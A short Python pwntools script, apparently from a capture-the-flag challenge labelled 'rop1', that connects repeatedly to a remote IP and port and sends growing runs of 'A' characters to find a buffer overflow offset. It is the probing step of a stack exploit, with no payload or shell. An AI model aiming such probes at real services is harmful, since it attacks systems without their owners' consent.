#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

# rop1
for i in range(20):
    p = remote('192.241.138.174',9998)
    offset = 64+i
    payload = 'A'*offset
    print "[+] ",i
    p.sendline(payload)
    print p.recvall()
    p.close()
    # p.interactive()
